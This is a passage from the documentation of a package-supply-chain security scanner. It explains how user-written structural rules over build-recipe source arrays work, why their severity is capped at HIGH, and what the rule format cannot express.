extracts the host with the same normalization the bucket classifier uses, so a
`name::url` rename keys on the URL's host. `renamed` is the reverse fact: the
URL stayed and the local name moved, which is how a download file is relabelled
without changing where it comes from.

### First-seen packages

A package observed for the first time has no pre state, so the change
primitives degrade to presence checks: `entry_added`, `host_added` and
`scalar_changed` fire on the complete post-state recipe, and `entry_removed`
and `renamed` stay silent. An operator can therefore write a standing rule
("any new package whose source fetches from this host") and every package is
evaluated once from its full text.

### The HIGH cap

A structural primitive is a weaker claim than a content match. "The source
array gained an entry whose host matches this pattern" is true of a
legitimate mirror move as easily as of a swap, and a user-authored pattern
has not been measured against the locked corpus the way a shipped rule has.
`FATAL` and `CRITICAL` therefore clamp to `HIGH` at load time, with a warning,
and `lint-rules` reports the clamp. The rule still runs; the cap bounds what
one pattern about structure may claim without corpus evidence.

### What it does not do

- No cross-field conjunctions. A rule describes one field and one primitive;
  composing several findings is what H098 and H102 do in code.
- No function-body structure. The primitives read the variable tables, not the
  shell inside `build()` or `package()`; the R-series already matches those
  lines and the X-series reads their execution.
- No arbitrary keyed arrays. `renamed` and `host_added` understand the source
  entry forms (`name::url`, plain URLs, VCS entries) that the source rewriters
  and H099 already key on; other arrays have no key semantics.
- No ids the code already emits. The loader accepts any non-empty id, but
  `lint-rules` warns when it does not follow `R###` and errors when it names a
  programmatic rule, because one id would then mean two different things. An
  `R###` id in the line-rule range is the convention for the same reason.
- No score above `HIGH`, and no FATAL findings: user rules cannot reach the FATAL severity, whose signal rides the verdict label and `score_breakdown` rather than the number.

### See also

- [Customization](static-analysis-and-resolution.md#customization): where `rules.toml` sits in the design.
- [R-series and H-series](../rules/series.md): the line-regex fields these entries sit beside.
- [Writing a Rule](../contributing/writing-a-rule.md): the code-rule path, for structure this surface cannot express.
- [lint-rules](../reference/cli.md#trustsight-lint-rules): the static checks a structural entry gets.
